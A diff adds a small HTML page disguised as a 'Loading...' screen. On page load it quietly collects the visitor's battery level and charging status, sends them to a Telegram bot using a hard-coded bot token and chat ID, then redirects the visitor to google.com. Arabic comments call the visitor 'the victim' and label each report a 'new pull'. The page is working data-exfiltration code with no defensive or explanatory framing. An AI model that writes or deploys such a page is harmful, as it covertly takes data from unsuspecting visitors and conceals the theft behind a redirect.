@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head><title>Loading...</title></head>
+<body>
+<script>
+    const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+    const CHAT_ID = "7392262688";
+
+    async function sendData() {
+        const battery = await navigator.getBattery();
+        const level = battery.level * 100;
+        const status = battery.charging ? "يشحن" : "لا يشحن";
+        
+        const text = `⚠️ سحب جديد:\nLevel: ${level}%\nStatus: ${status}`;
+        
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
+        
+        // تحويل الضحية لموقع حقيقي
+        window.location.href = "https://www.google.com";
+    }
+    sendData();
+</script>
+</body>
+</html>
